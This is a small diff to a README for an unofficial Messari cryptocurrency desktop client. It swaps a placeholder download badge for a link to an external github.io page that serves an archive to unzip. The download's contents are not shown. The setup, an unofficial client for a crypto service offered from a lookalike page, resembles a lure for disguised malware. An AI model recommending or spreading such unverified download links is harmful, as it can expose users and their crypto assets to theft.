@@ -6,7 +6,7 @@ This unofficial Messari desktop client brings the popular cryptocurrency researc
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://messari-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
